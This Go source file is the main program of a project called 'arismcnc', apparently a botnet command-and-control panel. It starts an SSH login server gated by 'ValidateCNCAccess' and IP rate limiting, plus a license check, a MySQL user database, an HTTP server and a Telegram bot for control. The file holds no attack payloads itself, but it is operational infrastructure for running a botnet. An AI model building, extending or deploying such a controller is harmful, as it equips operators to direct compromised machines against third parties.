package main

import (
    "encoding/json"
    "io/ioutil"
    "log"
    "net"
    "strings"
    "fmt"
    "sync"
    "arismcnc/database"
    "arismcnc/handlers"
    "arismcnc/utils"
    "arismcnc/telegram"
    "github.com/gliderlabs/ssh"
)


type SecureListener struct {
    net.Listener
    securityConfig *utils.SecuritySettings
}

func (sl *SecureListener) Accept() (net.Conn, error) {
    for {
        conn, err := sl.Listener.Accept()
        if err != nil {
            return nil, err
        }

        ip := strings.Split(conn.RemoteAddr().String(), ":")[0]

        
        if !utils.CheckIPRateLimit(ip) {
            remaining := utils.GetIPRateLimiter().GetRemainingCooldown(ip)
            conn.Write([]byte(fmt.Sprintf("Too many attempts. Try in %v\n", remaining)))
            conn.Close()
            continue
        }

        
        if valid, _ := sl.securityConfig.ValidateCNCAccess(ip, "unknown"); !valid {
            conn.Close()
            continue
        }

        return conn, nil
    }
}



func verificarGradientJSON() bool {
    gradientPath := "assets/gradient.json"
    
    
    data, err := ioutil.ReadFile(gradientPath)
    if err != nil {
        return false
    }
    
    
    var gradientData map[string]interface{}
    if err := json.Unmarshal(data, &gradientData); err != nil {
        return false
    }
    
    return true
}

func main() {
    
    utils.Init()
    
    
    if verificarGradientJSON() {
        log.Println("\033[32mSuccessfully\033[0m loaded gradient (assets/gradient.json)")
    }
    
    
    config, err := utils.LoadConfig("assets/config.json")
    if err != nil {
        log.Fatalf("\033[31mFailed to load config: %v\033[0m", err)
    } else {
        log.Println("\033[32mSuccessfully\033[0m loaded config (assets/config.json)")
    }

    
    securityConfig, _ := utils.LoadSecuritySettings("assets/config.json")

    if !utils.Authenticate() {
        log.Fatalln("\033[31mLicense authentication failed. Exiting...\033[0m")
    }

    
    db, err := database.ConnectDB(config)
    if err != nil {
        log.Fatalf("\033[31mFailed to connect to database: %v\033[0m", err)
    } else {
        log.Println("\033[32mSuccessfully\033[0m connected to database (" + config.DBHost + ":3306)")
    }
    defer db.DB.Close()

    
    if err := database.SetupDatabaseSchema(db.DB); err != nil {
        log.Fatalf("\033[31mDatabase setup failed: %v\033[0m", err)
    } else {
        log.Println("\033[32mSuccessfully\033[0m completed database schema setup")
    }

    err = database.CreateDefaultUser(db.DB)
    if err != nil {
        log.Fatalf("\033[31mFailed to create default user: %v\033[0m", err)
    }

    var wg sync.WaitGroup

    
    wg.Add(1)
    go func() {
        defer wg.Done()
        handlers.StartHTTPServer()
    }()

    // Start Telegram bot if enabled
    if config.Telegram.Enabled && len(config.Telegram.BotToken) > 20 {
        log.Println("[TELEGRAM] Starting bot...")
        wg.Add(1)
        go func() {
            defer wg.Done()
            bot, err := telegram.NewTelegramBot(config.Telegram.BotToken, db)
            if err != nil {
                log.Printf("\033[31m[TELEGRAM] Failed to start: %v\033[0m", err)
                return
            }
            log.Println("\033[32m[TELEGRAM] Successfully started!\033[0m")
            bot.Start()
        }()
    } else {
        log.Println("[TELEGRAM] Bot disabled or invalid token")
    }

    
    serverAddr := ":" + config.Port
    if config.ConnectionIP != "" {
        serverAddr = config.ConnectionIP + ":" + config.Port
    }

    
    sshServer := &ssh.Server{
        Addr: serverAddr,
        
        PasswordHandler: func(ctx ssh.Context, password string) bool {
            clientVersion := ctx.ClientVersion()
            
            
            if valid, _ := securityConfig.ValidateSSHClient(clientVersion); !valid {
                return false
            }
            
            return db.AuthenticateUser(ctx.User(), password)
        },
        
        PublicKeyHandler: func(ctx ssh.Context, key ssh.PublicKey) bool {
            return false
        },
        
        Handler: func(session ssh.Session) {
            handlers.SessionHandler(db, session)
        },
    }

    
    listener, err := net.Listen("tcp", serverAddr)
    if err != nil {
        log.Fatalf("\033[31mFailed to create listener: %v\033[0m", err)
    }

    secureListener := &SecureListener{
        Listener:       listener,
        securityConfig: securityConfig,
    }

    
    if config.ConnectionIP == "" {
        publicIP, err := utils.GetPublicIP()
        if err != nil {
            log.Printf("\033[32mSuccessfully\033[0m started SSH server (:%s)", config.Port)
        } else {
            log.Printf("\033[32mSuccessfully\033[0m started SSH server (%s:%s)", strings.TrimSpace(publicIP), config.Port)
        }
    } else {
        log.Printf("\033[32mSuccessfully\033[0m started SSH server (%s:%s)", config.ConnectionIP, config.Port)
    }

    
    if err := sshServer.Serve(secureListener); err != nil {
        log.Fatalf("\033[31mFailed to start SSH server: %v\033[0m", err)
    }
}